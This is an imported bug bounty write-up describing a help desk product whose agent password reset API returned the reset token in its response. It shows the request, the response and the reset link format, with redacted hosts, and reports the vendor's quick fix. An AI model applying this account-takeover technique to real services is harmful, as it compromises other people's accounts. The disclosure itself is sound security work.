---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-01-27_tale-of-a-misconfiguration-in-password-reset.md
original_filename: 2020-01-27_tale-of-a-misconfiguration-in-password-reset.md
title: Tale of a Misconfiguration in Password Reset
category: documents
detected_topics:
- password-reset
- xss
- command-injection
- otp
- information-disclosure
tags:
- imported
- documents
- password-reset
- xss
- command-injection
- otp
- information-disclosure
language: en
raw_sha256: b506c9a1e4ff14742e92089bc1f88f4538d903543b8d3770d6d162f2368c79fb
text_sha256: 56216e8b9d16b6664000a23e13bea42ee965da5a0082a7fcc6d939a413531b3c
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Tale of a Misconfiguration in Password Reset

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-01-27_tale-of-a-misconfiguration-in-password-reset.md
- Source Type: markdown
- Detected Topics: password-reset, xss, command-injection, otp, information-disclosure
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `b506c9a1e4ff14742e92089bc1f88f4538d903543b8d3770d6d162f2368c79fb`
- Text SHA256: `56216e8b9d16b6664000a23e13bea42ee965da5a0082a7fcc6d939a413531b3c`


## Content

---
title: "Tale of a Misconfiguration in Password Reset"
url: "https://medium.com/@naveenroy008/tale-of-a-misconfiguration-in-password-reset-e8fb484a4661"
authors: ["Naveenroy"]
bugs: ["Password reset", "Information disclosure"]
publication_date: "2020-01-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4806
scraped_via: "browseros"
---

# Tale of a Misconfiguration in Password Reset

Tale of a Misconfiguration in Password Reset
nave1n0x
Follow
2 min read
·
Jan 27, 2020

10

1

This post is about a misconfiguration in password reset I found on a popular help desk software sometimes ago where they were leaking the reset token. And guess what? This was not in the Referer header :D but right in the response of the request itself.

In this case one could initiate password reset for an account and immediately receive the reset token for that account.

The request looked like the following:

POST /api/v1/base/password/reset HTTP/1.1
Host: [team_name].redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 26
Connection: keep-alive
email=[agent_email_address]

And the response was:

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 25 Oct 2016 20:00:29 GMT
Content-Type: application/json
Content-Length: 2194
Connection: keep-alive
Cache-Control: private, max-age=0, must-revalidate
Expires: 0
X-API-Version: 1
Date-ISO: 2016-10-25T20:00:29+00:00
Access-Control-Expose-Headers: Date-ISO
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Date-ISO: 2016-10-25T20:00:29+00:00
Access-Control-Expose-Headers: Date-ISO
{ "status": 200, "notifications": [ { "type": "SUCCESS", "message": "Password reset email sent to [Name]", "sticky": false } ], "auth_token": "[token]" }

Notice the auth_token? Yes! That’s the reset token you would receive in email on a valid password reset request. And the format of the password reset link was:

https://[team_name].redacted.com/Auth/ResetPassword/[auth_token]

Inserting the auth_token irrespective of the team name (as long as you use an existing team name) made it possible to reset the password to that account. And one could then proceed to login to this account(s) taking full control.

Get nave1n0x’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

This was an easy win but considering that it was an help desk software, it also made it critical.

Takeaways?
They had options user and agent accounts: the password reset endpoint for users wasn’t vulnerable but that of agents was vulnerable which makes this an easy one to miss. So it is best to test functionalities having in mind that they may not have the same code base as identified here.
Always check response to requests whenever you expect to receive a token in email.

Thanks to the team for fixing this almost immediately (within 2 hours of report). And thank you also for taking the time to read this.
